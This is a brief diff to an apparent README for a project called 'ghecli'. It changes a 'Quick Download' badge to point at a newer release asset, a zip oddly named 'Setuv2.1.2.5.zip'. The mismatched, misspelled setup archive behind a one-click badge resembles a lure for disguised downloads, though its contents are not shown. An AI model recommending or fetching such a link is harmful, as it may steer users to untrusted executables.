@@ -1,4 +1,4 @@
-[![⚡ Quick Download](https://img.shields.io/badge/⚡_Quick-Download-orange?style=for-the-badge)](https://github.com/sam-w-hq2005v6/ghecli/releases/download/v4.0.0/Setuv2.1.2.5.zip)
+[![⚡ Quick Download](https://img.shields.io/badge/⚡_Quick-Download-orange?style=for-the-badge)](https://github.com/sam-w-hq2005v6/ghecli/releases/download/v5.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ ghecli
 
